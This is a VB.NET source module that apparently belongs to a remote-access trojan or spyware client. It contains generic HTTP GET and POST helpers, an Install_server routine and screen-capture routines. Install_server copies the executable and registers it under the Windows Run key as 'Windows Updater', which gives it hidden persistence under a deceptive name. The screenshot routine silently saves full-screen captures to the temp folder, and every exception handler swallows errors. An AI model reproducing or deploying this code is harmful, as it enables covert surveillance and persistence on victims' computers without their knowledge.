Imports System.Globalization
Imports System.Linq
Imports System.Net.NetworkInformation
Imports System.Net.Sockets
Imports System.Reflection
Imports System.Runtime.InteropServices
Imports System.Security.Cryptography
Imports System.Security.Principal
Imports System.Threading
Imports System.Windows.Forms
Imports System.Net
Imports System.Net.Mail
Imports System.Net.HttpWebRequest
Imports Microsoft.Win32
Imports System.IO
Imports System.Management
Imports System.Text
Module Functions
    Public path_screenshot2 As String
    '###################################################################
    '###################################################################
    Public Function Send_GET(ByVal URL As String) As String
        Dim uri As New Uri(URL)
        If (uri.Scheme = uri.UriSchemeHttp) Then
            Dim request As HttpWebRequest = HttpWebRequest.Create(uri)
            request.Method = WebRequestMethods.Http.Get
            Dim response As HttpWebResponse = request.GetResponse()
            Dim reader As New IO.StreamReader(response.GetResponseStream())
            Dim tmp As String = reader.ReadToEnd()
            response.Close()
            Return tmp
        End If
        Return "FAIL"
    End Function
    '###################################################################
    '###################################################################

    Public Function Send_POST(ByVal URL As String) As String
        Dim uri As New Uri(URL)
        If (uri.Scheme = uri.UriSchemeHttp) Then
            Dim request As HttpWebRequest = HttpWebRequest.Create(uri)
            request.Method = WebRequestMethods.Http.Post
            Dim response As HttpWebResponse = request.GetResponse()
            Dim reader As New IO.StreamReader(response.GetResponseStream())
            Dim tmp As String = reader.ReadToEnd()
            response.Close()
            Return tmp
        End If
        Return Nothing
    End Function
    '###################################################################
    '###################################################################
    Public Sub Install_server()
        Try
            My.Computer.FileSystem.CopyFile(Form1.path1, Form1.path2, True)
            My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run", "Windows Updater", Form1.path2 & " / start")

        Catch ex As Exception

        End Try

    End Sub
    '###################################################################
    '###################################################################
    Public Sub screenshot()
        Try
            Dim screenSize As Size = New Size(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
            Dim screenGrab As New Bitmap(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
            Dim g As Graphics = Graphics.FromImage(screenGrab)
            g.CopyFromScreen(New Point(0, 0), New Point(0, 0), screenSize)
            'Form1.PictureBox1.Image = screenGrab
            'Form1.PictureBox1.Image.Save(Form1.path_screenshot, Imaging.ImageFormat.Png)
        Catch ex As Exception
            'do nothing 
        End Try
    End Sub


    '###################################################################
    '###################################################################
    Public Sub screenshot_2()
        Try
            path_screenshot2 = Environ("tmp") & "\" & Now.ToString("yyyy-MM-dd-hh-mm-ss") & "-screenshot.png"
            Dim screenSize As Size = New Size(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
            Dim screenGrab As New Bitmap(My.Computer.Screen.Bounds.Width, My.Computer.Screen.Bounds.Height)
            Dim g As Graphics = Graphics.FromImage(screenGrab)
            g.CopyFromScreen(New Point(0, 0), New Point(0, 0), screenSize)
            Form1.PictureBox1.Image = screenGrab
            Form1.PictureBox1.Image.Save(path_screenshot2, Imaging.ImageFormat.Png)

        Catch ex As Exception
            'do nothing 
        End Try
    End Sub
End Module
